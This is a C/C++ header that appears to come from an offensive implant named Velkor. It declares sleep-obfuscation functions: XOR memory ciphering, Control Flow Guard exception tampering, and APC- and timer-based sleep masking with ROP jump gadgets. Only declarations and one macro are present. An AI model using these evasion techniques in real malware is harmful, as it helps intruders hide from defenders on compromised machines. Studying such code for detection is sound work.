#include <Velkor.h>

/*============[ Obf.cc ]============*/

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
        Rop[ i ].Rax = U_64( p );                   \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
        Rop[ i ].Rbx = U_64( & p );                 \
    } else {                                        \
        Rop[ i ].Rip = U_64( p );                   \
    }

EXTERN_C enum {
    VelkorNtWait,
    VelkorTimer,
    VelkorApc
} eVKSLEEP;

/*!
 * @brief 
 * Xor algorithm to cipher memory block
 * 
 * @param MemPtr
 * Pointer to memory to cipher
 * 
 * @param MemSize
 * Size of memory to cipher
 * 
 * @param KeyPtr
 * Pointer to key to use in cipher
 * 
 * @param KeySize
 * Size of key to use in cipher
 */
VOID XorCipher( 
    _In_ PBYTE  MemPtr, 
    _In_ SIZE_T MemSize, 
    _In_ PBYTE  KeyPtr, 
    _In_ SIZE_T KeySize 
);

/*!
 * @brief
 * Add memory address to CFG exception, its very important to sleep obfuscation
 * 
 * @param ProcessHandle
 * Process handle to add CFG exception
 * 
 * @param BaseAddress
 * Base address to add CFG exception
 * 
 * @param Size
 * Size of address to add CFG exception
 */
VOID CfgExceptionPrivateAdd(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID  BaseAddress,
    _In_ DWORD  Size
);

/*!
 * @brief 
 * Add API/Function to CFG exception
 * 
 * @param ImageBase
 * Image base to add in CFG exception
 * 
 * @param Function
 * Function address to add in CFG exception
 */
VOID CfgExceptionAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
);

/*!
 * @brief
 * Check if CFG is enabled in current process
 * 
 * @return
 * Return true if enabled, and false to disabled
 */
BOOL CfgCheckEnabled(
    VOID
);

/*!
 * @brief
 * Sleep obfuscation APC base using Stack Duplication during sleep, Heap Obf, JmpGadgets, NtContinue gadget and NtTestAlert return
 * 
 * @param SleepTime
 * Time to sleep
 */
VOID ApcObf( 
    _In_ ULONG SleepTime
);

/*!
 * @brief 
 * Sleep obfuscation Timer based using Stack Duplication during sleep, Heap Obf, JmpGadgets and NtContinue gadget
 * 
 * @param SleepTime
 * Time to sleep
 */
VOID TimerObf(
    _In_ ULONG SleepTime
);

/*!
 * @brief
 * Wrapper function for handler sleep technique
 * 
 * @param SleepTime
 */
VOID SleepMain(
    _In_ ULONG SleepTime
);